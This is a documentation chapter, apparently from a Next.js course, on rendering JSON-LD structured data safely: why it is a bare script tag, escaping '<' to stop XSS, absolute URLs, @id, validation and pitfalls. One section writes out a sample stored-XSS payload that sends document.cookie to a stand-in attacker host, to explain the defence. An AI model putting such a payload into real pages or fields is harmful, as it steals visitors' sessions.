---
title: "JSON-LD is the one piece of SEO markup the Metadata API refuses to emit for you, so you render the `script` tag yourself — and `JSON.stringify` alone makes that an XSS sink the documentation warns about in its own example"
sidebar_label: "02c · JSON-LD and structured data"
sidebar_position: 107
description: "Why structured data is a bare script tag in the component tree rather than a metadata field, the escaping the docs mandate and the attack it stops, why next/script is the wrong tool, why metadataBase does not reach inside the payload, and typing with schema-dts."
---

<span className="db-tier t-master">Master</span>

> Verified: 2026-09-04 against the Next.js
> [JSON-LD guide](https://nextjs.org/docs/app/guides/json-ld) (page `lastUpdated: 2026-03-02`),
> the [`generateMetadata` reference](https://nextjs.org/docs/app/api-reference/functions/generate-metadata)
> section *Unsupported Metadata* (`2026-08-25`), and
> [schema.org](https://schema.org/).
> Version spine: **Next.js 16.3.4** · React 19.2.8. `next` is **not installed in this checkout** —
> documentation-verified only, **no sandbox run**, no output blocks.

**Every other tag in this chapter is something you declare and the framework emits. Structured data is the exception: the Metadata API refuses `<script>` outright, so JSON-LD is a real element you render in a real component, with all the consequences that follow — you own its escaping, you own its URLs, and `metadataBase` does not reach inside it. The documentation's own snippet carries a warning most people skim past: `JSON.stringify` does not sanitise, and a product name containing `</script>` will close the tag and run whatever comes next. This page is the pattern, the escaping, and every way the pattern goes wrong.**

## Why it is a `script` tag and not a metadata field

[01c](01c-the-tags-the-metadata-api-will-not-emit.md) covers the six tags the Metadata API permanently refuses; `<script>` is one of them. That refusal is not an oversight for JSON-LD, it is the correct outcome — and the guide says so:

> *"Our current recommendation for JSON-LD is to render structured data as a `<script>` tag in your `layout.js` or `page.js` components."*

This works because React hoists `<script>`, `<link>`, `<meta>` and `<title>` elements rendered anywhere in the component tree into the document head. You are not fighting the framework by rendering a script tag in the middle of a page component; that is the sanctioned mechanism.

🔴 **Do not reach for `next/script`.** The guide is explicit about why:

> *"The `next/script` component is optimized for loading and executing JavaScript. Since JSON-LD is structured data, not executable code, a native `<script>` tag is the right choice here."*

`next/script` exists to schedule *execution* — `beforeInteractive`, `afterInteractive`, `lazyOnload`. A `type="application/ld+json"` block is never executed by the browser at all; it is inert data with a MIME type the parser does not recognise as script. Scheduling it does nothing useful and, on a deferred strategy, actively delays the moment it appears in the DOM for a crawler that renders JavaScript.

## The pattern, with the escaping the docs require

```tsx
// app/products/[id]/page.tsx
import type { Product, WithContext } from 'schema-dts'

export default async function Page({
  params,
}: {
  params: Promise<{ id: string }>
}) {
  const { id } = await params
  const product = await getProduct(id)

  const jsonLd: WithContext<Product> = {
    '@context': 'https://schema.org',
    '@type': 'Product',
    name: product.name,
    image: product.imageUrl,
    description: product.description,
  }

  return (
    <section>
      <script
        type="application/ld+json"
        dangerouslySetInnerHTML={{
          __html: JSON.stringify(jsonLd).replace(/</g, '\\u003c'),
        }}
      />
      <h1>{product.name}</h1>
    </section>
  )
}
```

Three parts of that are load-bearing and none of them are optional.

**`dangerouslySetInnerHTML`, not a child.** Writing `<script>{JSON.stringify(jsonLd)}</script>` makes React treat the JSON as a text child and escape it as HTML text — `&` becomes `&amp;`, `<` becomes `&lt;` — which produces a payload that is no longer valid JSON. The `dangerouslySetInnerHTML` form is the only one that writes the string through untouched, which is exactly why the escaping below becomes your job.

**`.replace(/</g, '\\u003c')`.** The guide's warning, verbatim:

> *"The following snippet uses `JSON.stringify`, which does not sanitize malicious strings used in XSS injection. To prevent this type of vulnerability, you can scrub `HTML` tags from the `JSON-LD` payload, for example, by replacing the character, `<`, with its unicode equivalent, `\u003c`."*

**`WithContext<Product>` from `schema-dts`.** Optional for correctness, load-bearing for maintenance — it is the only thing that will tell you `offers` needs an `@type` of its own.

## The attack the escape stops

This is worth spelling out, because *"escape it, the docs say so"* is not knowledge you can act on when a reviewer asks why.

An HTML parser terminates a `<script>` element at the first literal `</script` sequence in the text, **regardless of JavaScript or JSON quoting rules.** JSON has no idea it is inside a script element; the parser has no idea it is looking at JSON. So a product whose description a user set to:

```text
Great value </script><script>fetch('https://evil.example/?c='+document.cookie)</script>
```

serialises to perfectly valid JSON, gets written into the page verbatim, and the parser sees the payload's `</script>` as the end of your structured-data block and the following `<script>` as a new, executable one. Stored XSS, delivered by the SEO layer, on a page that never rendered user HTML anywhere else.

Replacing every `<` with the escape sequence `\u003c` defeats it because **`\u003c` inside a JSON string is decoded by the JSON parser back to `<`, but the six characters actually written into the HTML byte stream contain no `<` at all.** The structured data still reads correctly to Google; the HTML parser never sees a tag boundary. One substitution, no cost, and it is why the replace call is in the documentation's own example rather than in a footnote.

If you would rather not rely on remembering it at each call site — and you should not — wrap it once:

```tsx
// lib/json-ld.tsx
import type { Thing, WithContext } from 'schema-dts'

export function JsonLd({ data }: { data: WithContext<Thing> }) {
  return (
    <script
      type="application/ld+json"
      dangerouslySetInnerHTML={{
        __html: JSON.stringify(data).replace(/</g, '\\u003c'),
      }}
    />
  )
}
```

Every page then renders `<JsonLd data={jsonLd} />` and the escaping cannot be forgotten. The guide offers the heavier alternative too:

> *"Review your organization's recommended approach to sanitize potentially dangerous strings, or use community maintained alternatives for `JSON.stringify` such as, serialize-javascript."*

That is the heavier option and the right call if you are serialising anything richer than a flat object of your own strings — its exact escape set is its own documentation's business and is not asserted here. For a JSON-LD payload built from your own database fields, the single replace is what the documentation shows and is sufficient for the tag-boundary attack described above.

## `metadataBase` does not reach inside the payload

This is the handoff [01d](01d-metadatabase-url-composition-and-the-parent-promise.md) makes, and it catches people who have just internalised the opposite rule for metadata.

`metadataBase` composes relative URLs in **URL-valued metadata fields**. A JSON-LD block is not a metadata field; it is a string you built. Nothing inspects it, nothing rewrites it, and a relative `image` or `url` inside it will ship exactly as written — no build error, no warning, just a structured-data record pointing at a path that means nothing outside your origin.

```tsx
// 🔴 WRONG — these ship relative and mean nothing to a consumer
const jsonLd: WithContext<Product> = {
  '@context': 'https://schema.org',
  '@type': 'Product',
  name: product.name,
  image: '/products/widget.png',
  url: `/products/${id}`,
}

// ✅ Build them absolute, from the same source metadataBase uses
const base = process.env.NEXT_PUBLIC_SITE_URL! // e.g. https://sprintdesk.app

const jsonLd: WithContext<Product> = {
  '@context': 'https://schema.org',
  '@type': 'Product',
  '@id': `${base}/products/${id}#product`,
  name: product.name,
  image: new URL(`/products/widget.png`, base).toString(),
  url: new URL(`/products/${id}`, base).toString(),
}
```

Using the *same* environment variable that feeds `metadataBase` is the point. Two sources of truth for the origin is how a preview deployment ends up with a canonical on the preview host and structured data on production.

## Where to put it, and what `@id` is for

Structured data composes across a route the way metadata does not — there is no merge, so two components each rendering a block simply produce two blocks, and consumers read both.

| Entity | Where it belongs | Why |
|---|---|---|
| `Organization`, `WebSite` | root `layout.tsx` | True for every page; declaring it once is correct. |
| `BreadcrumbList` | the layout that owns the breadcrumb UI | It describes navigation, which is a layout concern. |
| `Product`, `Article`, `Event` | the leaf `page.tsx` | Per-route data; needs `params`. |
| `FAQPage`, `HowTo` | the component that renders the content | The markup and the data must not drift apart. |

`@id` is how you say *"the `Product` in this block and the `Offer` in that block are about the same thing."* Give every entity a stable, absolute `@id` — conventionally the canonical URL plus a fragment — and separate blocks link up into one graph rather than being read as unrelated records. The alternative is a single block with an `@graph` array, which is equivalent and often easier to validate.

## Validating it

> *"You can validate and test your structured data with the Rich Results Test for Google or the generic Schema Markup Validator."*

Two different tools with two different jobs. [`validator.schema.org`](https://validator.schema.org/) tells you whether the payload is *well-formed schema.org* — right types, right property names, no nonsense. The [Rich Results Test](https://search.google.com/test/rich-results) tells you whether Google will *do* anything with it, which is a much narrower question: it checks the required and recommended properties for the specific rich result you are hoping for. A payload can pass the first and be ignored by the second because it is missing a property that is optional in schema.org and required by Google.

🔴 Both fetch the URL you give them, so both are subject to everything in [02f](02f-what-the-unfurlers-actually-fetch.md) — they see what a crawler sees, not what your browser sees. That is a feature: it is the cheapest way to find out that your structured data is inside a Suspense boundary that had not resolved yet.

## Gotchas

**★ A product name containing `</script>` executes attacker JavaScript.** `JSON.stringify` produces valid JSON; the HTML parser does not care about JSON quoting and closes the element at the first `</script`. Fix: `.replace(/</g, '\\u003c')` on the serialised string, ideally inside a single shared `JsonLd` component so no call site can omit it.

**★ `<script>{JSON.stringify(jsonLd)}</script>` renders escaped entities and validates as broken JSON.** React escapes text children, so `&` becomes `&amp;` and the payload stops being parseable. Fix: use `dangerouslySetInnerHTML` — and then you must add the `<` escape, because you have opted out of React's escaping entirely.

**★ Relative URLs inside JSON-LD ship as-is.** `metadataBase` only composes metadata fields. There is no build error and no warning. Fix: build every `url`, `image` and `@id` with `new URL(path, base).toString()` from the same environment variable that feeds `metadataBase`.

**★ `next/script` used for JSON-LD delays or breaks it.** It is a loader for executable JavaScript; an `ld+json` block is inert data. On a deferred strategy the block appears later than the crawler's snapshot. Fix: a bare `<script>` element in the tree.

**★ The JSON-LD block sits inside a Suspense boundary and is missing from the crawler's view.** A component that suspends does not emit its script until it resolves, and for a bot that does not execute JavaScript, "later in the stream" can mean "not at all" if the connection is cut. Fix: render structured data from a component that does not await anything slow — build the object from data you already have, or hoist the block above the boundary.

**★ Two pages emit `Organization` and a validator reports a duplicate entity.** Both a layout and a page declared it. Fix: declare site-level entities in exactly one place — the root layout — and give every entity a stable `@id` so a consumer can tell "the same organisation, mentioned twice" from "two organisations".

**★ Structured data disagrees with the visible page and the rich result is withheld.** A `Product` block advertising a price the page does not show is a policy violation, not a bug, and search engines act on it. Fix: build the JSON-LD from the *same* fetched object the component renders from — never from a second query, and never from constants.

**★ `schema-dts` types compile but the Rich Results Test reports missing fields.** `schema-dts` encodes schema.org, which marks almost everything optional. Google's requirements are stricter and are documented per rich-result type, not in the vocabulary. Fix: treat the type as a spelling checker, and the Rich Results Test as the requirements checker; run both.

**★ You add JSON-LD to a `'use client'` component and it works — until it does not.** It will render, because React hoists the tag from anywhere, but you have now shipped the entire payload to the browser as part of the client bundle *and* made it dependent on hydration for any bot that only reads the initial HTML. Fix: keep structured data in Server Components.

**★ Dates in the payload are `Date` objects.** `JSON.stringify` turns them into ISO strings, which is usually what you want — but a `Date` that came out of an ORM as a local-time value serialises with the wrong offset. Fix: call `.toISOString()` explicitly so the intent is visible at the call site.

## Interview questions

**★ Why is JSON-LD not a field on the `metadata` object, and is that a design gap?**
It is not a gap. The Metadata API is a declarative model of `<head>` tags with defined shapes; `<script>` is one of six element types it permanently refuses, because a script is arbitrary content the framework cannot validate, cannot merge across segments, and cannot safely escape on your behalf. Rendering the tag in the component tree is the sanctioned alternative and it works because React hoists `<script>`, `<link>` and `<meta>` from anywhere in the tree into the head. What you give up is the merge semantics — two components each rendering a block produce two blocks — and what you gain is that the payload can be built from the same object the page renders from.

**★ Explain precisely why `JSON.stringify` is unsafe here, given that its output is always valid JSON.**
Because the consumer that breaks is the HTML parser, not the JSON parser. An HTML parser ends a `<script>` element at the first literal `</script` sequence in its text, with no awareness of JSON string quoting. A user-supplied field containing `</script><script>…</script>` therefore terminates your data block and opens an executable one. Replacing `<` with `\u003c` fixes it because the JSON parser decodes that escape back to `<` when reading the data, while the HTML byte stream never contains a `<` that could start a tag. It is a serialisation-context mismatch, not a JSON bug — the same class of problem as SQL injection through a correctly-quoted string.

**★ Your product page's structured data has `"image": "/products/widget.png"` and validates fine locally. What happens in production?**
It ships exactly like that. `metadataBase` composes relative URLs only in URL-valued *metadata fields*; a JSON-LD payload is an opaque string you constructed, so nothing rewrites it and nothing errors. A consumer receiving a relative URL in a structured-data record has no base to resolve it against and will either drop the image or drop the record. The fix is to build absolute URLs from the same environment variable that feeds `metadataBase`, so a preview deployment cannot end up with a preview canonical and a production image.

**★ When would you use `@graph` instead of separate script blocks?**
When the entities on the page reference each other and you want the relationships to be unambiguous in one document — a `BreadcrumbList` whose last item is the `Product`, an `Article` whose `publisher` is the `Organization`. Separate blocks with stable `@id`s are semantically equivalent and easier to colocate with the components that own each entity; a single `@graph` is easier to validate in one paste and avoids any question about whether a consumer merges blocks. Either is correct; mixing them without `@id`s is what produces "duplicate entity" reports.

**★ A page renders JSON-LD inside a `<Suspense>` boundary that waits on a slow review-count query. What is the risk?**
The script tag is emitted only when that component resolves, so it arrives late in the streamed response. A crawler that executes JavaScript and waits for the full document will see it; one that reads the initial HTML will not, and neither will any consumer whose fetch times out first — Meta's crawler documentation, for example, requires content to be crawlable "within a few seconds". The fix is not to disable streaming; it is to build the structured-data object from data the page already has and render the block outside the boundary, leaving the slow query to affect only the UI it belongs to.

{/* FOOTER */}
